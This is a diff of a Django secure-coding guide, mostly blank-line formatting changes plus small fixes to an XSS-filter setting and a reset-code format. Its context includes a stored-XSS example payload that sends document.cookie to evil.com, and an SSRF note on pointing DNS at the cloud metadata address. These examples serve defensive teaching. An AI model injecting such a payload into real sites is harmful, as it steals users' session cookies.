@@ -134,6 +134,7 @@ def ping_host(request):
 ```
 
 Additional prevention measures for injection attacks:
+
 - Use an ORM for database access whenever possible. ORMs generate parameterized queries by default.
 - Apply the principle of least privilege to your database user. The application's DB account should only have SELECT, INSERT, UPDATE, and DELETE permissions on the specific tables it needs. It should never have DROP, CREATE, or GRANT permissions.
 - Use stored procedures where appropriate, as they provide an additional layer of abstraction.
@@ -267,6 +268,7 @@ def login_view(request):
 ```
 
 Additional best practices for authentication:
+
 - Enforce multi-factor authentication (MFA) for sensitive operations and privileged accounts.
 - Set session tokens to expire after a reasonable period of inactivity (e.g., 30 minutes for sensitive applications).
 - Regenerate session IDs after login to prevent session fixation attacks.
@@ -282,6 +284,7 @@ Additional best practices for authentication:
 Cross-Site Scripting attacks occur when an application includes untrusted data in a web page without proper validation or escaping. XSS allows attackers to execute scripts in the victim's browser, potentially stealing session cookies, defacing websites, or redirecting users to malicious sites.
 
 There are three main types:
+
 - **Stored XSS**: The malicious script is permanently stored on the target server (e.g., in a database, forum post, or comment). Every user who views the affected page executes the script.
 - **Reflected XSS**: The malicious script is part of the request (e.g., in a URL query parameter) and is immediately reflected back in the response.
 - **DOM-based XSS**: The vulnerability exists in client-side JavaScript code that processes data from an untrusted source (e.g., `document.location`, `document.URL`).
@@ -289,6 +292,7 @@ There are three main types:
 **VULNERABLE code -- Stored XSS:**
 
 {% raw %}
+
 ```python
 # DANGEROUS: Rendering user input without escaping
 # views.py
@@ -304,11 +308,13 @@ def post_comment(request):
 # If an attacker posts: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
 # Every user who views the comments page will have their cookies stolen.
 ```
+
 {% endraw %}
 
 **SECURE code -- Proper output encoding:**
 
 {% raw %}
+
 ```python
 # SAFE: Django templates auto-escape by default
 # views.py -- same as above, but the template is different
@@ -330,6 +336,7 @@ def post_comment(request):
     Comment.objects.create(user=request.user, text=clean_text)
     return redirect("/comments/")
 ```
+
 {% endraw %}
 
 **VULNERABLE code -- Reflected XSS:**
@@ -347,6 +354,7 @@ def search(request):
 **SECURE code -- Escaped output:**
 
 {% raw %}
+
 ```python
 # SAFE: Use Django's template engine which auto-escapes
 from django.shortcuts import render
@@ -367,6 +375,7 @@ def search(request):
     safe_query = escape(query)
     return HttpResponse(f"<h1>Search results for: {safe_query}</h1>")
 ```
+
 {% endraw %}
 
 **Content Security Policy (CSP)** is a critical defense against XSS. Even if an XSS vulnerability exists, a strong CSP can prevent the injected script from executing:
@@ -430,6 +439,7 @@ def transfer_money(request):
 **SECURE code -- Django CSRF protection:**
 
 {% raw %}
+
 ```python
 # SAFE: Django's built-in CSRF protection
 # settings.py
@@ -465,6 +475,7 @@ MIDDLEWARE = [
 #     body: JSON.stringify({to: '...', amount: 100}),
 # });
 ```
+
 {% endraw %}
 
 **SECURE code -- SameSite cookie attribute:**
@@ -483,6 +494,7 @@ CSRF_COOKIE_SECURE = True
 ```
 
 Additional CSRF defenses:
+
 - Always verify the `Origin` and `Referer` headers on state-changing requests as an additional check.
 - For API-only backends using token authentication (e.g., JWT in Authorization header), CSRF is not a concern because the browser does not automatically attach the token. CSRF is specifically a cookie-based vulnerability.
 - Use the `Lax` SameSite attribute as a baseline. Use `Strict` for highly sensitive applications.
@@ -576,6 +588,7 @@ class DeleteUserView(APIView):
 ```
 
 Best practices for access control:
+
 - Deny by default. Every endpoint should require authentication and authorization unless explicitly marked as public.
 - Test authorization for every endpoint with different user roles: unauthenticated, regular user, admin, and users trying to access other users' resources.
 - Use UUIDs instead of sequential integer IDs to make IDOR attacks harder to enumerate (though this is not a replacement for proper authorization checks).
@@ -630,7 +643,7 @@ LOGGING = {
 }
 
 # Ensure secure defaults
-SECURE_BROWSER_XSS_FILTER = True
+SECURE_BROWSER_XSS_FILTER = False  # X-XSS-Protection is deprecated (can backfire); rely on CSP
 SECURE_CONTENT_TYPE_NOSNIFF = True
 X_FRAME_OPTIONS = 'DENY'
 SECURE_SSL_REDIRECT = True
@@ -724,6 +737,7 @@ def load_preferences(signed_data):
 ```
 
 Additional prevention measures:
+
 - Never deserialize data from untrusted sources using `pickle`, `yaml.load()` (use `yaml.safe_load()` instead), or Java's `ObjectInputStream` without strict filtering.
 - Implement integrity checks (HMAC, digital signatures) on serialized objects.
 - Log deserialization failures as potential attack indicators.
@@ -804,6 +818,7 @@ True
 **How to read this output:** the first call is rejected on scheme/host before DNS even runs, but the real defense is the loop over `getaddrinfo` -- an attacker can register `evil.com` and point its DNS A record at `169.254.169.254`, so a naive `if "169.254" in url` check would pass while the actual connection still hits the metadata service. Resolving the hostname and rejecting any private, loopback, link-local, or reserved address closes that hole. The `allow_redirects=False` matters because an allow-listed host can return a 302 to an internal URL, smuggling the request past your host check.
 
 Additional SSRF defenses:
+
 - Prefer never fetching user-controlled URLs at all. If you must, use a strict allow-list of exact hosts.
 - Block the link-local range (`169.254.0.0/16`), loopback (`127.0.0.0/8`), and RFC 1918 private ranges (`10/8`, `172.16/12`, `192.168/16`) at both the application and the network egress level.
 - Require IMDSv2 (token-based metadata) on AWS, which forces a `PUT` to obtain a token first and defeats the simple `GET` that classic SSRF relies on.
@@ -1362,7 +1377,7 @@ Anything security-sensitive -- session tokens, password-reset tokens, API keys, 
 import secrets
 
 token = secrets.token_urlsafe(32)   # ~43-char URL-safe token, CSPRNG-backed
-reset_code = secrets.randbelow(10**6)  # 6-digit code, no modulo bias
+reset_code = f"{secrets.randbelow(10**6):06d}"  # 6-digit code (zero-padded), no modulo bias
 api_key = "sk_live_" + secrets.token_hex(24)
 ```
 
@@ -1386,3 +1401,5 @@ The hardest part of applied cryptography is not encrypting -- it's protecting th
 - **Separate duties and limit access**: the people/services that can use a key to decrypt should be a tiny, audited set, distinct from those who manage it.
 
 > **Key Takeaway:** Pick the primitive that matches the goal -- hash for integrity, encrypt for confidentiality, HMAC/signature for authenticity, encoding for transport (never for security). Default to AEAD (AES-GCM/ChaCha20-Poly1305) with a unique nonce per message, generate all secrets with a CSPRNG, compare secrets in constant time, and keep keys in a KMS with envelope encryption and rotation. Don't roll your own crypto; misuse, not math, is what gets breached.
+
+*Last reviewed: 2026-06-08*
